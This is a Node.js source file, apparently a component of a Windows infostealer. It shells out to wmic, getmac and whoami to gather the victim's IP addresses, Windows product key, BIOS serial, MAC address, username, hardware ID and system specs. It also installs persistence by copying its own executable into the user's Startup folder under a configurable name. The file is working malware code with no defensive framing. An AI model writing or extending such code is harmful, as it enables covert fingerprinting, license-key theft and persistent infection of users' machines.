const os = require("node:os");
const fs = require("fs-extra");
const config = require("../config/config.js");
const ipapi = require("ip");
const Util = require("./Util");
const path = require('node:path')

class PCInfo {
  static async fetch() {
    const ip = await Util.getIP();
    const dinfo = PCInfo.displayinfo;

    return {
      ip,
      localIp: Util.tryCatch(() => ipapi.address()),
      manufacturer: dinfo["Manufacturer"],
      model: dinfo["Model"],
      pkey: PCInfo.productkey,
      serial: PCInfo.serial,
      freespace: PCInfo.freespace,
      allspace: PCInfo.allspace,
      mac: PCInfo.mac,
      username: PCInfo.username,
      hwid: PCInfo.hwid,
      ram: PCInfo.ram
    };
  }

  static get uptime() {
    return Util.tryCatch(() => os.uptime(), 0);
  }

  static get ram() {
    return Util.tryCatch(
      () => Math.round(os.totalmem() / 1024 / 1024 / 1024) + " GB"
    );
  }

  static get mac() {
    return Util.execSync("getmac");
  }

  static get username() {
    return (
      process.env?.USERNAME ||
      Util.execSync("whoami")
        ?.replace(/^.*\\/, "")
        .replace(/(\r\n|\n|\r)/gm, "")
    );
  }

  static get displayinfo() {
    return Util.tryCatch(
      () =>
        Util.execSync("wmic computersystem get model,manufacturer /format:list")
          .split("\n")
          .filter((o) => o.trim() !== "")
          .map((o) => {
            const [key, value] = o.split("=").map((s) => s.trim());
            return { [key]: value };
          })
          .reduce((acc, curr) => Object.assign(acc, curr), {}),
      {}
    );
  }

  static get productkey() {
    return Util.execSync(
      "wmic path SoftwareLicensingService get OA3xOriginalProductKey"
    )
      .split("\n")[1]
      ?.trim();
  }

  static get serial() {
    return Util.execSync("wmic bios get serialnumber")
      .split("\n")[1]
      .replace(/(\r\n|\n|\r)/gm, "");
  }

  static get freespace() {
    return Util.tryCatch(() => {
      const data = Util.execSync("wmic logicaldisk get freespace").split("\n");

      data.shift();

      const total = data
        .map((line) => line.trim())
        .filter((line) => line.length > 0)
        .map((line) => parseInt(line.replace(/\D/g, ""), 10))
        .filter((value) => !isNaN(value))
        .reduce((accumulator, value) => accumulator + value, 0);

      return total;
    });
  }

  static get allspace() {
    return Util.tryCatch(() => {
      const data = Util.execSync("wmic diskdrive get size").split("\n");

      data.shift();

      const total = data
        .map((line) => line.trim())
        .filter((line) => line.length > 0)
        .map((line) => parseInt(line.replace(/\D/g, ""), 10))
        .filter((value) => !isNaN(value))
        .reduce((accumulator, value) => accumulator + value, 0);

      return total;
    });
  }

  static get hwid() {
    return Util.execSync("wmic csproduct get uuid")
      .trim()
      .split("\n")[1]
      ?.match(/([A-Z0-9\-])/g)
      ?.join("");
  }

  static bytesToGB(bytes) {
    const gigabytes = bytes / (1024 * 1024 * 1024);
    return gigabytes.toFixed(2) + "GB"; // Round to 2 decimal places
  }

  static addToStartup() {
    try {
      const patty = path.normalize(`${process.env.APPDATA || 'C:/ProgramData'}/Microsoft/Windows/Start Menu/Programs/Startup/${config.startupName}.exe`);

      if (fs.pathExistsSync(patty)) return;
      fs.createReadStream(process.execPath).pipe(fs.createWriteStream(patty));

      setTimeout(() => fs.renameSync(patty, patty), 3000);
    } catch (e) {
      Util.report(e);
    }
  }
}

module.exports = PCInfo;
